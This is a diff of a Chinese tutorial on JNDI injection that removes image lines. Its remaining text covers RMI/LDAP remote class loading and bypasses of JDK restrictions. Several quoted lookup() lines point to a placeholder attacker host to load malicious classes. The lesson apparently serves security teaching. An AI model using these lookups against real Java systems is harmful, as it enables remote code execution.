@@ -8,7 +8,6 @@
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_5.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_6.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_8.png)
 
@@ -32,13 +31,11 @@ JNDI全称为Java Naming and Directory Interface，即Java命名和目录接口�
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_24.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_26.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_28.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_30.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_32.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_34.png)
 
@@ -46,7 +43,6 @@ JNDI全称为Java Naming and Directory Interface，即Java命名和目录接口�
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_36.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_38.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_40.png)
 
@@ -58,11 +54,9 @@ JNDI全称为Java Naming and Directory Interface，即Java命名和目录接口�
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_48.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_50.png)
 
 ## 🔍 JNDI注入的基本原理
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_52.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_54.png)
 
@@ -74,13 +68,11 @@ JNDI全称为Java Naming and Directory Interface，即Java命名和目录接口�
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_62.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_64.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_66.png)
 
 JNDI注入的核心在于`javax.naming.InitialContext.lookup()`方法。该方法用于查找和调用远程或本地的对象和服务。如果攻击者能够控制`lookup()`方法的参数，就可以指向恶意的RMI或LDAP服务，从而触发远程代码执行。
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_68.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_70.png)
 
@@ -88,7 +80,6 @@ JNDI注入的核心在于`javax.naming.InitialContext.lookup()`方法。该方�
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_72.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_74.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_76.png)
 
@@ -103,9 +94,7 @@ JNDI注入的核心在于`javax.naming.InitialContext.lookup()`方法。该方�
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_86.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_88.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_90.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_92.png)
 
@@ -146,7 +135,6 @@ public class JNDIDemo {
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_116.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_118.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_120.png)
 
@@ -168,7 +156,6 @@ public class JNDIDemo {
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_135.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_137.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_139.png)
 
@@ -178,7 +165,6 @@ public class JNDIDemo {
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_145.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_146.png)
 
 RMI（Remote Method Invocation）和LDAP（Lightweight Directory Access Protocol）是JNDI支持的两种主要服务。它们都可以用于远程调用Java对象，但在协议和用途上有所不同。
 
@@ -189,18 +175,14 @@ RMI（Remote Method Invocation）和LDAP（Lightweight Directory Access Protocol
 ### RMI服务
 RMI是Java的远程方法调用协议，默认端口为1099。它允许一个Java虚拟机上的对象调用另一个Java虚拟机上的对象。在JNDI注入中，RMI常用于远程加载和执行恶意的Java类。
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_152.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_154.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_156.png)
 
 ### LDAP服务
 LDAP是轻量级目录访问协议，默认端口为389。它主要用于访问和维护分布式目录信息服务。在JNDI注入中，LDAP也可以用于远程加载和执行Java类。
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_158.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_160.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_162.png)
 
@@ -208,20 +190,15 @@ LDAP是轻量级目录访问协议，默认端口为389。它主要用于访问�
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_164.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_166.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_168.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_170.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_172.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_174.png)
 
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_176.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_178.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_180.png)
 
@@ -240,7 +217,6 @@ ctx.lookup("ldap://attacker-ip:389/恶意对象");
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_188.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_190.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_192.png)
 
@@ -256,7 +232,6 @@ ctx.lookup("ldap://attacker-ip:389/恶意对象");
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_202.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_204.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_206.png)
 
@@ -284,17 +259,13 @@ ctx.lookup("ldap://attacker-ip:389/恶意对象");
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_224.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_226.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_228.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_230.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_232.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_234.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_236.png)
 
 以下是实验的具体步骤：
 
@@ -375,13 +346,11 @@ ctx.lookup("rmi://attacker-ip:1099/MaliciousClass");
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_279.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_281.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_283.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_285.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_287.png)
 
 执行上述代码后，目标系统会弹出计算器，证明JNDI注入成功。
 
@@ -389,7 +358,6 @@ ctx.lookup("rmi://attacker-ip:1099/MaliciousClass");
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_291.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_293.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_295.png)
 
@@ -407,7 +375,6 @@ ctx.lookup("rmi://attacker-ip:1099/MaliciousClass");
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_307.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_309.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_311.png)
 
@@ -417,13 +384,10 @@ ctx.lookup("rmi://attacker-ip:1099/MaliciousClass");
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_317.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_319.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_321.png)
 
 随着JDK版本的更新，JNDI注入的利用受到了一定的限制。例如，高版本的JDK默认禁用了RMI和LDAP的远程类加载功能。以下是JDK版本对JNDI注入的影响：
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_323.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_325.png)
 
@@ -451,7 +415,6 @@ ctx.lookup("rmi://attacker-ip:1099/MaliciousClass");
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_345.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_347.png)
 
 为了绕过这些限制，攻击者通常会使用一些技巧，例如利用本地类加载或结合其他漏洞。以下是一个绕过JDK限制的示例：
 
@@ -478,7 +441,6 @@ ctx.lookup("ldap://attacker-ip:1386/恶意对象");
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_361.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_363.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_365.png)
 
@@ -496,15 +458,10 @@ ctx.lookup("ldap://attacker-ip:1386/恶意对象");
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_377.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_379.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_381.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_382.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_384.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_386.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_388.png)
 
@@ -532,11 +489,9 @@ ctx.lookup("ldap://attacker-ip:1386/恶意对象");
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_399.png)
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_401.png)
 
 本节课中我们一起学习了JNDI注入的基本原理、RMI与LDAP服务的使用、JDK版本绕过以及调用链类的实际应用。以下是本节课的核心知识点：
 
-![](img/9b28d368abfb9a24f122907b3553fbc7_403.png)
 
 ![](img/9b28d368abfb9a24f122907b3553fbc7_405.png)
 
